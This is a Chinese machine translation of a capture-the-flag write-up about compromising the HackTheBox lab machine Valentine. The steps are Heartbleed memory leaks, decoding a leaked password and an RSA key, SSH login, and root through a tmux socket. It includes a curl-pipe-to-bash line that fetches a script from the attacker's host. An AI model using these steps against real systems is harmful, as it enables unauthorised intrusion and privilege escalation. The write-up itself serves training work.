<html>
<head>
<title>Valentine — A Heartbleed HackTheBox Walk-Through</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">情人节——令人心碎的黑客盒子演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/valentine-a-heartbleed-hackthebox-walk-through-d16a514bf1eb?source=collection_archive---------1-----------------------#2018-08-03">https://infosecwriteups.com/valentine-a-heartbleed-hackthebox-walk-through-d16a514bf1eb?source=collection_archive---------1-----------------------#2018-08-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/407f2acba0869556d35e48cbd1d72354.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Tg0hBrrezaYxH8AyIPvNiA.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">世界上流血的心联合起来</figcaption></figure><p id="2098" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我在5月份完成了《情人节》,但它最近退役了，所以我想我应该写一篇关于我如何扎根于这个盒子的文章。</p><h1 id="04b9" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">摘要</h1><p id="b5d3" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">Valentine是一台运行web服务的Linux机器，很容易受到心脏出血的攻击。该漏洞被利用来获取从内存中转储的密码。该密码与在web目录中找到的加密RSA密钥相结合，以获得主机上的SSH访问权限。从那里，以root用户身份运行的进程被访问，以获得具有提升权限的交互式shell。</p><h1 id="ba05" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">侦察</h1><p id="19f2" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">我像往常一样用一个<code class="fe md me mf mg b">nmap -sV -sC</code>扫描来枚举服务版本并运行默认脚本:</p><figure class="mh mi mj mk gt jr"><div class="bz fp l di"><div class="ml mm l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">nmap</figcaption></figure><p id="8295" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我可以看到SSH是打开的，在80和443上运行着web服务。当我访问每个web服务时，它们都返回相同的主页，没有源代码中列出的超链接或目录。这些服务都返回了表明Ubuntu主机的操作系统信息。</p><p id="ffca" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">然后，我继续用gobuster枚举web目录:</p><pre class="mh mi mj mk gt mn mg mo mp aw mq bi"><span id="ac5b" class="mr lb iq mg b gy ms mt l mu mv">gobuster -k -u <a class="ae mw" href="https://10.10.10.79" rel="noopener ugc nofollow" target="_blank">https://10.10.10.79</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></pre><figure class="mh mi mj mk gt jr"><div class="bz fp l di"><div class="ml mm l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">gobuster</figcaption></figure><blockquote class="mx my mz"><p id="4bd3" class="kc kd na ke b kf kg kh ki kj kk kl km nb ko kp kq nc ks kt ku nd kw kx ky kz ij bi translated"><code class="fe md me mf mg b">-k</code>忽略SSL证书(否则自签名证书会抛出错误)<br/> <code class="fe md me mf mg b">-u</code>指定URL <br/> <code class="fe md me mf mg b">-w</code>指定单词列表</p></blockquote><p id="b5d0" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">从这里，我去了<code class="fe md me mf mg b">/dev</code>目录，至少看看那里有什么。我找到了两个文件:<code class="fe md me mf mg b">hype_key</code>和<code class="fe md me mf mg b">notes.txt</code>。</p><figure class="mh mi mj mk gt jr"><div class="bz fp l di"><div class="ml mm l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">notes.txt</figcaption></figure><p id="9c7f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">另一个文件<code class="fe md me mf mg b">hype_key</code>，看起来像一堆十六进制值。我用curl把它放到一个文件中，它看起来像这样:</p><pre class="mh mi mj mk gt mn mg mo mp aw mq bi"><span id="32c0" class="mr lb iq mg b gy ms mt l mu mv">curl -k <a class="ae mw" href="https://10.10.10.79/dev/hype_key" rel="noopener ugc nofollow" target="_blank">https://10.10.10.79/dev/hype_key</a> &gt; hype_key</span></pre><figure class="mh mi mj mk gt jr"><div class="bz fp l di"><div class="ml mm l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">炒作_关键</figcaption></figure><p id="505d" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我能够将它放入Burpsuite中，并将其从ASCII十六进制解码为明文，这是一个加密的RSA密钥，其主体格式很差:</p><figure class="mh mi mj mk gt jr"><div class="bz fp l di"><div class="ml mm l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">相当混乱</figcaption></figure><p id="9a26" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">好的，我们知道这里的<em class="na">应该看起来像一个RSA密钥。但是有许多额外的空格字符使它看起来超级棒。我决定用python来转换文件，只用几行就去掉了空格字符。</em></p><figure class="mh mi mj mk gt jr"><div class="bz fp l di"><div class="ml mm l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">用python清理hype_key</figcaption></figure><p id="e0c6" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">最终产品看起来完全符合预期！</p><figure class="mh mi mj mk gt jr"><div class="bz fp l di"><div class="ml mm l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">现在这样好多了</figcaption></figure><p id="d338" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">太好了！但是如果没有密码，这把钥匙就没什么用了。所以我不得不回到服务器上找点别的东西戳戳。在<code class="fe md me mf mg b">/encode</code>和<code class="fe md me mf mg b">/decode</code>目录下的页面看起来是简单的base64转换器。页面上看不到源代码，也没有链接到页面上的任何其他内容，所以我觉得这不是一个值得掉进的兔子洞。</p><h1 id="8390" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">剥削</h1><p id="68a6" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">主页上的<a class="ae mw" href="http://heartbleed.com" rel="noopener ugc nofollow" target="_blank"> <strong class="ke ir"> Heartbleed标志</strong> </a>是这个盒子的重要暗示。由于我在机器上没有找到太多其他的东西，我运行了一个searchsploit，发现有几个漏洞利用脚本和一些metasploit模块可用于此。其中一个对我很有效的标题是“OpenSSL TLS heart beat Extension—‘heart bleed’内存泄漏”。在kali中，文件名位于<code class="fe md me mf mg b">/usr/share/exploitdb/exploits/multiple/remote/32745.py</code></p><pre class="mh mi mj mk gt mn mg mo mp aw mq bi"><span id="420f" class="mr lb iq mg b gy ms mt l mu mv">./32745.py 10.10.10.79</span></pre><figure class="mh mi mj mk gt jr"><div class="bz fp l di"><div class="ml mm l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">心脏出血</figcaption></figure><p id="42a6" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">当机器接收到更多的流量时，这个漏洞就变得非常混乱。在它退役后，我重新访问了它以运行对要点的利用，内存转储中唯一的东西正是我所需要的。然而，随着其他流量冲击服务器，我不得不多次运行该漏洞，以获得正确的信息进行转储。总之，我需要的是:</p><pre class="mh mi mj mk gt mn mg mo mp aw mq bi"><span id="225d" class="mr lb iq mg b gy ms mt l mu mv">$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</span></pre><p id="5bd5" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这被传递到<code class="fe md me mf mg b">/decode.php</code>中，因此我们可以尝试对其进行base64解码:</p><pre class="mh mi mj mk gt mn mg mo mp aw mq bi"><span id="bbeb" class="mr lb iq mg b gy ms mt l mu mv">echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d</span></pre><p id="cb9d" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这将返回字符串<code class="fe md me mf mg b">heartbleedbelievethehype</code>，我们可以尝试使用它来解密RSA密钥:</p><pre class="mh mi mj mk gt mn mg mo mp aw mq bi"><span id="d7b1" class="mr lb iq mg b gy ms mt l mu mv">openssl rsa -in python.key -out new.key</span></pre><p id="50a4" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">出现提示时，输入密码，一个新的RSA密钥被写入一个名为<code class="fe md me mf mg b">new.key</code>的文件中！我们可以用这个密钥SSH到Valentine…但是用户是什么？这一步只是盲目猜测，但最终我根据密钥和密码猜测出了用户<code class="fe md me mf mg b">hype</code>的以下命令:</p><pre class="mh mi mj mk gt mn mg mo mp aw mq bi"><span id="e31c" class="mr lb iq mg b gy ms mt l mu mv">ssh hype@10.10.10.79 -i new.key</span></pre><p id="db4f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我被录取了！我可以从这里拿到<code class="fe md me mf mg b">user.txt</code>旗。</p><h1 id="50fe" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">权限提升</h1><p id="f40e" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">从这里开始，我对Linux主机进行了典型的枚举。我运行<a class="ae mw" href="https://github.com/rebootuser/LinEnum" rel="noopener ugc nofollow" target="_blank"> LinEnum.sh </a>并开始检查输出，以获得更多关于主机上正在发生什么以及我可以访问什么的上下文信息。</p><p id="a616" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我最喜欢的运行方式是将这个bash脚本放在Kali的一个目录中，并使用python SimpleHTTPServer托管它:</p><pre class="mh mi mj mk gt mn mg mo mp aw mq bi"><span id="e60b" class="mr lb iq mg b gy ms mt l mu mv">python -m SimpleHTTPServer 80</span></pre><p id="5fcd" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">然后，在远程机器上，打开脚本并将其直接传送到bash:</p><pre class="mh mi mj mk gt mn mg mo mp aw mq bi"><span id="2a64" class="mr lb iq mg b gy ms mt l mu mv">curl http://X.X.X.X/Linenum.sh | bash</span></pre><p id="397c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">主机上没有写入文件！</p><p id="5daa" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">不管怎样，尽管返回了很多，我还是不能用这个脚本直接<em class="na">识别我的privesc路径。我不得不把手弄脏，手动绕着主机爬。根目录下有一个隐藏的<code class="fe md me mf mg b">.dev</code>文件夹。这引起了我的注意，我在其中发现了一个名为<code class="fe md me mf mg b">dev_sess</code>的文件，该文件归<code class="fe md me mf mg b">root</code>所有，但每个人都可以执行。</em></p><p id="769b" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在<code class="fe md me mf mg b">dev_sess</code>上运行<code class="fe md me mf mg b">file</code>命令返回它是一个“套接字”。过了一会儿，我发现程序<code class="fe md me mf mg b">tmux</code>可以连接到这些文件并返回交互式外壳！让我们试一试:</p><pre class="mh mi mj mk gt mn mg mo mp aw mq bi"><span id="cabd" class="mr lb iq mg b gy ms mt l mu mv">tmux -S /.devs/dev_sess</span></pre><p id="0ecb" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">果然，这返回了一个以root身份运行的shell！游戏结束。</p></div></div>    
</body>
</html>